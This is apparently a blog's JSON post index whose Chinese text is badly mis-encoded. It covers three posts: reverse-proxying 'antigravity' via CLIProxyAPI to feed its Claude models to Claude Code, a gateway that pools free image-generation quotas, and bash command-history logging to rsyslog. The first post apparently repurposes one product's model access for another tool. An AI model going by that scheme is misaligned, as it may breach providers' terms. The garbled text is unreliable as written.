[{"content":"ç”¨CLIProxyAPIåä»£äº†antigravityï¼ŒæŠ½å‡ºäº†claudeçš„æ¨¡å‹ç»™claude codeç”¨\nåŒæ—¶ä¹Ÿæ¥å…¥äº†qwen3-code-plusæ¨¡å‹\nè¿˜æ¥å…¥äº†openrouterçš„æ¨¡å‹\nåæœŸè¿˜å‡†å¤‡æ¥å…¥minmaxç­‰æ¨¡å‹\nè¿™æ ·å°±å‡ºç°ä¸ªé—®é¢˜ï¼šè®¿é—® antigravity éœ€è¦ä»£ç†ï¼Œè€Œè®¿é—®qwenå’Œopenrouteræˆ–è€…å…¶å®ƒå¯èƒ½å¹¶ä¸éœ€è¦\nå¦‚æœè®¾ç½®äº†å…¨å±€ä»£ç†ï¼Œé‚£è®¿é—®å…¶å®ƒ2ä¸ªè®¿é—®å°±ç»•è·¯äº†\næœ¬æ¥æƒ³æä¸ªPRçš„ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸æ˜¯ä»€ä¹ˆå¤§éœ€æ±‚\næ‰€ä»¥å¹²è„†ç”¨claudeæ”¹äº†ä¸€ä¸‹ï¼Œé…ç½®æ–‡ä»¶config.yamlä¸­æ–°å¢äº†ä¸€ä¸ªé…ç½®é¡¹\nantigravity_proxy: \u0026#34;\u0026#34; è¿™æ ·æ–¹ä¾¿äº†å°±\nä»£ç æ”¾åœ¨ï¼šGitHub - zhangrr/CLIProxyAPI: modify CLIProxyAPI\nclaude code çš„ settings.json é…ç½®å¦‚ä¸‹ï¼š\n{ â€œenvâ€: { â€œANTHROPIC_BASE_URLâ€: â€œhttp://10.8.2.25:8317â€, â€œANTHROPIC_AUTH_TOKENâ€: â€œsk-xxxxxxxâ€, â€œANTHROPIC_DEFAULT_HAIKU_MODELâ€: â€œqwen3-coder-plusâ€, â€œANTHROPIC_DEFAULT_OPUS_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€, â€œANTHROPIC_DEFAULT_SONNET_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€, â€œANTHROPIC_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€ } } è¯·è‡ªè¡Œå–ç”¨\n","permalink":"https://rendoumi.com/posts/20251230-cliproxyapi_antigravity/","summary":"\u003cp\u003eç”¨CLIProxyAPIåä»£äº†antigravityï¼ŒæŠ½å‡ºäº†claudeçš„æ¨¡å‹ç»™claude  codeç”¨\u003c/p\u003e\n\u003cp\u003eåŒæ—¶ä¹Ÿæ¥å…¥äº†qwen3-code-plusæ¨¡å‹\u003c/p\u003e\n\u003cp\u003eè¿˜æ¥å…¥äº†openrouterçš„æ¨¡å‹\u003c/p\u003e\n\u003cp\u003eåæœŸè¿˜å‡†å¤‡æ¥å…¥minmaxç­‰æ¨¡å‹\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±å‡ºç°ä¸ªé—®é¢˜ï¼šè®¿é—® antigravity éœ€è¦ä»£ç†ï¼Œè€Œè®¿é—®qwenå’Œopenrouteræˆ–è€…å…¶å®ƒå¯èƒ½å¹¶ä¸éœ€è¦\u003c/p\u003e\n\u003cp\u003eå¦‚æœè®¾ç½®äº†å…¨å±€ä»£ç†ï¼Œé‚£è®¿é—®å…¶å®ƒ2ä¸ªè®¿é—®å°±ç»•è·¯äº†\u003c/p\u003e\n\u003cp\u003eæœ¬æ¥æƒ³æä¸ªPRçš„ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸æ˜¯ä»€ä¹ˆå¤§éœ€æ±‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥å¹²è„†ç”¨claudeæ”¹äº†ä¸€ä¸‹ï¼Œé…ç½®æ–‡ä»¶config.yamlä¸­æ–°å¢äº†ä¸€ä¸ªé…ç½®é¡¹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eantigravity_proxy: \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·æ–¹ä¾¿äº†å°±\u003c/p\u003e\n\u003cp\u003eä»£ç æ”¾åœ¨ï¼š\u003ca href=\"https://www.github.com/zhangrr/CLIProxyAPI\"\u003eGitHub - zhangrr/CLIProxyAPI: modify CLIProxyAPI\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eclaude code çš„ settings.json é…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  â€œenvâ€: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    â€œANTHROPIC_BASE_URLâ€: â€œhttp://10.8.2.25:8317â€,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    â€œANTHROPIC_AUTH_TOKENâ€: â€œsk-xxxxxxxâ€,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    â€œANTHROPIC_DEFAULT_HAIKU_MODELâ€: â€œqwen3-coder-plusâ€,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    â€œANTHROPIC_DEFAULT_OPUS_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    â€œANTHROPIC_DEFAULT_SONNET_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    â€œANTHROPIC_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯·è‡ªè¡Œå–ç”¨\u003c/p\u003e","title":"CLIProxyAPIåä»£antigravityå•ç‹¬èµ°ä»£ç†"},{"content":"åœ¨åˆ«äººçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ‰‹æ“äº†ä¸€ä¸ªåˆ©ç”¨ä¸‰ä¸ªæ¨¡å‹æä¾›å•†çš„å…è´¹æ¨¡å‹é¢åº¦ï¼Œæ¥æ–‡ç”Ÿå›¾çš„ç¨‹åº\nåŸåœ°å€ï¼šhttps://github.com/lianwusuoai/img-router ï¼Œ[æ™ºèƒ½å›¾åƒç”Ÿæˆç½‘å…³ï¼Œé€šè¿‡OpenAI å…¼å®¹æ¥å£ï¼Œä½¿ç”¨chatè‡ªåŠ¨è·¯ç”±å¤šå¹³å° AI è¿›è¡Œå…è´¹ç»˜å›¾]\né­”æ”¹çš„åœ°å€ï¼šhttp://github.com/zhangrr/image-route\näº®ç‚¹ï¼šå…è´¹APIäººäººéƒ½æœ‰ï¼Œä¸éœ€è¦ä¸“é—¨ç»˜å›¾ç½‘ç«™ï¼Œä¸éœ€è¦è€ƒè™‘å„ç§æ¥å£ï¼Œä¸éœ€è¦çƒ¦æ¼Cherry Studio/RikkaHub/newapiç­‰å®¢æˆ·ç«¯orå¹³å°ä¸å…¼å®¹/ä¸æ”¯æŒï¼Œè®©æ–‡ç”Ÿå›¾/å›¾ç”Ÿå›¾/å›¾ç‰‡ç¼–è¾‘ï¼Œå°±åƒå’ŒaièŠå¤©chatä¸€æ ·æ–¹ä¾¿ã€‚\næ¨¡åŠ›æ–¹èˆŸå…è´¹keyæ¯å¤©100æ¬¡ æ— å®¡æ ¸ï¼Œä¸è¦ç™½å¤©éšä¾¿ç”Ÿå›¾ï¼Œæ¶©æ¶©è­¦å‘Š! é­”æ­å…è´¹keyæ¯å¤©2000æ¬¡ å•æ¨¡å‹500æ¬¡ ä¸å¯æ¶©æ¶©ï¼ è±†åŒ…4.0+4.5æ¯ä¸ªæ¨¡å‹200æ¬¡ï¼Œæ¯å¤©æœ€å¤šæ¢å¤20æ¬¡ï¼Œå¯ä»¥è®¾ç½®ä¸Šé™é˜²è¶…å‡º ä¸å¯æ¶©æ¶©ï¼ é‚£åŸç‰ˆæ˜¯åªèƒ½é€šè¿‡APIè¿›è¡Œè®¿é—®ï¼Œæ­£å¥½æœ‰claude codeçš„é¢åº¦ï¼Œé‚£å°±å¹²è„†å¥—ä¸ªwebçš„ç•Œé¢å‡ºæ¥\næ³¨æ„ï¼š\né­”åŠ›æ–¹èˆŸæ³¨å†Œåï¼Œç”Ÿæˆapiçš„keyå³å¯\né­”æ­æ˜¯é˜¿é‡Œçš„ï¼Œç”Ÿæˆapiçš„keyåï¼Œéœ€è¦ç»è¿‡é˜¿é‡Œçš„è´¦å·éªŒè¯ï¼Œæ‰èƒ½ä½¿ç”¨\nä¸è¦éƒ¨ç½²ä»»ä½•æ¨¡å‹ï¼Œé˜¿é‡Œçš„è´¦å·æœ€å¥½é‡Œé¢æ²¡æœ‰ç»‘å¡ï¼Œæ²¡æœ‰é’±\nè±†åŒ…æ˜¯ç«å±±å¼•æ“ï¼Œå¼€é€šè´¦å·ç”Ÿæˆapiçš„keyåï¼Œéœ€è¦å®äººè®¤è¯ï¼Œç„¶åè¿˜éœ€è¦éƒ¨ç½²æ¨¡å‹\næ‹¿åˆ°3ä¸ªå…è´¹çš„APIåï¼Œå…‹éš†æºä»£ç ï¼š\nhttp://github.com/zhangrr/image-route\nç„¶åæŠŠapiçš„keyå¡«å…¥config.jsï¼ˆå…‹éš†ä¸€ä¸‹config.example.jsï¼‰\nè£…å¥½denoï¼Œä¸€å¥è¯å°±å¯ä»¥è¿è¡Œäº†ï¼š\n./deno run --allow-net --allow-env --allow-write --allow-read main.ts ç”Ÿäº†ä¸€å¼ å›¾ï¼Œæ¨¡åŠ›æ–¹èˆŸï¼Œè¿˜å¯ä»¥ï¼š\n","permalink":"https://rendoumi.com/posts/20251230-img_router/","summary":"\u003cp\u003eåœ¨åˆ«äººçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ‰‹æ“äº†ä¸€ä¸ªåˆ©ç”¨ä¸‰ä¸ªæ¨¡å‹æä¾›å•†çš„å…è´¹æ¨¡å‹é¢åº¦ï¼Œæ¥æ–‡ç”Ÿå›¾çš„ç¨‹åº\u003c/p\u003e\n\u003cp\u003eåŸåœ°å€ï¼šhttps://github.com/lianwusuoai/img-router ï¼Œ[æ™ºèƒ½å›¾åƒç”Ÿæˆç½‘å…³ï¼Œé€šè¿‡OpenAI å…¼å®¹æ¥å£ï¼Œä½¿ç”¨chatè‡ªåŠ¨è·¯ç”±å¤šå¹³å° AI è¿›è¡Œå…è´¹ç»˜å›¾]\u003c/p\u003e\n\u003cp\u003eé­”æ”¹çš„åœ°å€ï¼šhttp://github.com/zhangrr/image-route\u003c/p\u003e\n\u003cp\u003eäº®ç‚¹ï¼šå…è´¹APIäººäººéƒ½æœ‰ï¼Œä¸éœ€è¦ä¸“é—¨ç»˜å›¾ç½‘ç«™ï¼Œä¸éœ€è¦è€ƒè™‘å„ç§æ¥å£ï¼Œä¸éœ€è¦çƒ¦æ¼Cherry Studio/RikkaHub/newapiç­‰å®¢æˆ·ç«¯orå¹³å°ä¸å…¼å®¹/ä¸æ”¯æŒï¼Œè®©æ–‡ç”Ÿå›¾/å›¾ç”Ÿå›¾/å›¾ç‰‡ç¼–è¾‘ï¼Œå°±åƒå’ŒaièŠå¤©chatä¸€æ ·æ–¹ä¾¿ã€‚\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ai.gitee.com/ondobtug/dashboard/settings/tokens\"\u003eæ¨¡åŠ›æ–¹èˆŸ\u003c/a\u003eå…è´¹keyæ¯å¤©100æ¬¡ æ— å®¡æ ¸ï¼Œä¸è¦ç™½å¤©éšä¾¿ç”Ÿå›¾ï¼Œæ¶©æ¶©è­¦å‘Š!\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.modelscope.cn/my/myaccesstoken\"\u003eé­”æ­\u003c/a\u003eå…è´¹keyæ¯å¤©2000æ¬¡ å•æ¨¡å‹500æ¬¡ ä¸å¯æ¶©æ¶©ï¼\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://console.volcengine.com/ark/region:ark+cn-beijing/openManagement/rewardPlan\"\u003eè±†åŒ…4.0+4.5\u003c/a\u003eæ¯ä¸ªæ¨¡å‹200æ¬¡ï¼Œæ¯å¤©æœ€å¤šæ¢å¤20æ¬¡ï¼Œå¯ä»¥è®¾ç½®ä¸Šé™é˜²è¶…å‡º ä¸å¯æ¶©æ¶©ï¼\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé‚£åŸç‰ˆæ˜¯åªèƒ½é€šè¿‡APIè¿›è¡Œè®¿é—®ï¼Œæ­£å¥½æœ‰claude codeçš„é¢åº¦ï¼Œé‚£å°±å¹²è„†å¥—ä¸ªwebçš„ç•Œé¢å‡ºæ¥\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eé­”åŠ›æ–¹èˆŸæ³¨å†Œåï¼Œç”Ÿæˆapiçš„keyå³å¯\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eé­”æ­æ˜¯é˜¿é‡Œçš„ï¼Œç”Ÿæˆapiçš„keyåï¼Œéœ€è¦ç»è¿‡é˜¿é‡Œçš„è´¦å·éªŒè¯ï¼Œæ‰èƒ½ä½¿ç”¨\u003c/p\u003e\n\u003cp\u003eä¸è¦éƒ¨ç½²ä»»ä½•æ¨¡å‹ï¼Œé˜¿é‡Œçš„è´¦å·æœ€å¥½é‡Œé¢æ²¡æœ‰ç»‘å¡ï¼Œæ²¡æœ‰é’±\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230154834644\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230154834644.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè±†åŒ…æ˜¯ç«å±±å¼•æ“ï¼Œå¼€é€šè´¦å·ç”Ÿæˆapiçš„keyåï¼Œéœ€è¦å®äººè®¤è¯ï¼Œç„¶åè¿˜éœ€è¦éƒ¨ç½²æ¨¡å‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155104015\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155104015.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155021461\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155021461.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155045439\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155045439.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæ‹¿åˆ°3ä¸ªå…è´¹çš„APIåï¼Œå…‹éš†æºä»£ç ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://github.com/zhangrr/image-route\"\u003ehttp://github.com/zhangrr/image-route\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åæŠŠapiçš„keyå¡«å…¥config.jsï¼ˆå…‹éš†ä¸€ä¸‹config.example.jsï¼‰\u003c/p\u003e\n\u003cp\u003eè£…å¥½denoï¼Œä¸€å¥è¯å°±å¯ä»¥è¿è¡Œäº†ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./deno run --allow-net --allow-env --allow-write --allow-read main.ts\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20251230155311769\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155311769.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç”Ÿäº†ä¸€å¼ å›¾ï¼Œæ¨¡åŠ›æ–¹èˆŸï¼Œè¿˜å¯ä»¥ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230155435398\" loading=\"lazy\" src=\"/posts/20251230-img_router/image-20251230155435398.png\"\u003e\u003c/p\u003e","title":"é­”æ­ã€æ¨¡åŠ›æ–¹èˆŸã€è±†åŒ…å…è´¹æ–‡ç”Ÿå›¾"},{"content":"ç”±äºè‡ªå·±å®é™…çš„å·¥ä½œæœºæ˜¯ä¸€å°Linuxï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯Debian 12\nå¤šæ•°æ—¶é—´å°±æ˜¯é€šè¿‡WindTerm sshç™»å½•åˆ°è¿™å°æœºå™¨ä¸Šï¼Œç„¶åå¼€å¤šä¸ªçª—å£ï¼Œå¼€å§‹å¹²æ´»\né‚£ä¹ˆæŸ¥çœ‹å†å²å‘½ä»¤å°±å˜å¾—å¾ˆé‡è¦äº†ï¼Œéœ€è¦å…¨éƒ¨è®°å½•ä¸‹æ¥ï¼Œéšæ—¶è¿›è¡ŒæŸ¥çœ‹\nå¦‚æœæ˜¯å…¬å¸çš„æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥åŠ ä¸Šè¿™ä¸ªï¼Œç»Ÿä¸€æŠŠå‘½ä»¤å†å²å‘é€åˆ°ç»Ÿä¸€çš„ä¸€å°æ—¥å¿—æœåŠ¡å™¨ä¸Šï¼Œè¿›è¡Œä¿ç®¡å’Œå®¡è®¡\nAnyï¼Œéƒ½å¾ˆé‡è¦ï¼Œè®°å½•ä¸€ä¸‹ï¼š\nä¸€ã€ç¼–è¾‘ /etc/profileï¼Œæ–°å¢ä¸‰å¥\nexport HISTTIMEFORMAT=\u0026#34;%Y-%m-%d %H:%M \u0026#34; export PROMPT_COMMAND=\u0026#39;RETRN_VAL=$?;logger -p local6.debug \u0026#34;$(whoami) [$$]: $(history 1 | sed \u0026#34;s/^[ ]*[0-9]\\+[ ]*//\u0026#34;) [$RETRN_VAL]\u0026#34;\u0026#39; export PROMPT_COMMAND=\u0026#34;history -a;history -c;history -r;$PROMPT_COMMAND\u0026#34; ç¬¬ä¸€å¥æ˜¯ä¸ºäº†ä½¿ç”¨ history çš„æ—¶å€™æ›´å¥½çœ‹ä¸€äº›\näºŒä¸‰å¥æ˜¯ä¸ºäº†æŠŠå†å²å‘½ä»¤å‘åˆ°æ—¥å¿—æœåŠ¡å™¨å»\näºŒã€å®‰è£…å¹¶è®¾ç½®rsyslog\napt install rsyslog vi /etc/rsyslog.d/00-my-format.conf # å®šä¹‰ä¸€ä¸ªç®€æ´çš„æ—¶é—´æ ¼å¼æ¨¡æ¿ï¼š2025-12-30 09:50 $template MyPreciseFormat,\u0026#34;%TIMESTAMP:1:10:date-rfc3339% %TIMESTAMP:12:16:date-rfc3339% %HOSTNAME% %syslogtag%%msg%\\n\u0026#34; # å°†è¿™ä¸ªæ¨¡æ¿è®¾ç½®ä¸ºæ‰€æœ‰æ—¥å¿—æ–‡ä»¶çš„é»˜è®¤æ ¼å¼ $ActionFileDefaultTemplate MyPreciseFormat vi /etc/rsyslog.conf ... auth,authpriv.* /var/log/auth.log cron.* -/var/log/cron.log kern.* -/var/log/kern.log mail.* -/var/log/mail.log user.* -/var/log/user.log local6.* /var/log/commands.log ... systemctl enable rsyslog systemctl restart rsyslog å¦‚ä¸Šï¼Œå°±ä¼šæŠŠå‘½ä»¤éƒ½å‘é€åˆ° /var/log/commands.log\nå¦‚æœè¦å‘é€åˆ°ç»Ÿä¸€çš„æœåŠ¡å™¨ï¼Œé‚£å°±åœ¨ /etc/rsyslog.confï¼ŒæŠŠæ‰€æœ‰æ—¥å¿—å‘åˆ°è¿œç¨‹å»\n*.* @@10.10.10.1:514 å¦‚ä¸Šå°±å¥½äº†ï¼Œé‡æ–°ç™»å½•ï¼Œå°±ä¼šæœ‰è®°å½•äº†ï¼Œcat /var/log/commands.log\n","permalink":"https://rendoumi.com/posts/20251230-linux_comand_log/","summary":"\u003cp\u003eç”±äºè‡ªå·±å®é™…çš„å·¥ä½œæœºæ˜¯ä¸€å°Linuxï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯Debian 12\u003c/p\u003e\n\u003cp\u003eå¤šæ•°æ—¶é—´å°±æ˜¯é€šè¿‡WindTerm sshç™»å½•åˆ°è¿™å°æœºå™¨ä¸Šï¼Œç„¶åå¼€å¤šä¸ªçª—å£ï¼Œå¼€å§‹å¹²æ´»\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæŸ¥çœ‹å†å²å‘½ä»¤å°±å˜å¾—å¾ˆé‡è¦äº†ï¼Œéœ€è¦å…¨éƒ¨è®°å½•ä¸‹æ¥ï¼Œéšæ—¶è¿›è¡ŒæŸ¥çœ‹\u003c/p\u003e\n\u003cp\u003eå¦‚æœæ˜¯å…¬å¸çš„æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥åŠ ä¸Šè¿™ä¸ªï¼Œç»Ÿä¸€æŠŠå‘½ä»¤å†å²å‘é€åˆ°ç»Ÿä¸€çš„ä¸€å°æ—¥å¿—æœåŠ¡å™¨ä¸Šï¼Œè¿›è¡Œä¿ç®¡å’Œå®¡è®¡\u003c/p\u003e\n\u003cp\u003eAnyï¼Œéƒ½å¾ˆé‡è¦ï¼Œè®°å½•ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€ç¼–è¾‘ /etc/profileï¼Œæ–°å¢ä¸‰å¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eHISTTIMEFORMAT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y-%m-%d %H:%M \u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePROMPT_COMMAND\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;RETRN_VAL=$?;logger -p local6.debug \u0026#34;$(whoami) [$$]: $(history 1 | sed \u0026#34;s/^[ ]*[0-9]\\+[ ]*//\u0026#34;) [$RETRN_VAL]\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePROMPT_COMMAND\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;history -a;history -c;history -r;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$PROMPT_COMMAND\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¬¬ä¸€å¥æ˜¯ä¸ºäº†ä½¿ç”¨ history çš„æ—¶å€™æ›´å¥½çœ‹ä¸€äº›\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251230100755555\" loading=\"lazy\" src=\"/posts/20251230-linux_comand_log/image-20251230100755555.png\"\u003e\u003c/p\u003e\n\u003cp\u003eäºŒä¸‰å¥æ˜¯ä¸ºäº†æŠŠå†å²å‘½ä»¤å‘åˆ°æ—¥å¿—æœåŠ¡å™¨å»\u003c/p\u003e\n\u003cp\u003eäºŒã€å®‰è£…å¹¶è®¾ç½®rsyslog\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install rsyslog\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi  /etc/rsyslog.d/00-my-format.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å®šä¹‰ä¸€ä¸ªç®€æ´çš„æ—¶é—´æ ¼å¼æ¨¡æ¿ï¼š2025-12-30 09:50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e MyPreciseFormat,\u003cspan class=\"s2\"\u003e\u0026#34;%TIMESTAMP:1:10:date-rfc3339% %TIMESTAMP:12:16:date-rfc3339% %HOSTNAME% %syslogtag%%msg%\\n\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å°†è¿™ä¸ªæ¨¡æ¿è®¾ç½®ä¸ºæ‰€æœ‰æ—¥å¿—æ–‡ä»¶çš„é»˜è®¤æ ¼å¼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$ActionFileDefaultTemplate\u003c/span\u003e MyPreciseFormat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/rsyslog.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth,authpriv.*                 /var/log/auth.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecron.*                          -/var/log/cron.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekern.*                          -/var/log/kern.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003email.*                          -/var/log/mail.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser.*                          -/var/log/user.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal6.*                        /var/log/commands.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e rsyslog\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart rsyslog\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚ä¸Šï¼Œå°±ä¼šæŠŠå‘½ä»¤éƒ½å‘é€åˆ° /var/log/commands.log\u003c/p\u003e","title":"Linuxæœºå™¨çš„å†å²å‘½ä»¤æŸ¥è¯¢å’Œä¿å­˜"},{"content":"Dev.to ä¸Šé¢æœ‰ä¸€ç¯‡æ·±åº¦å¥½æ–‡ï¼Œæœ€è¿‘åœ¨å­œå­œä¸å€¦çš„å­¦ä¹ AIï¼Œæ„Ÿè§‰ä»€ä¹ˆCluaude 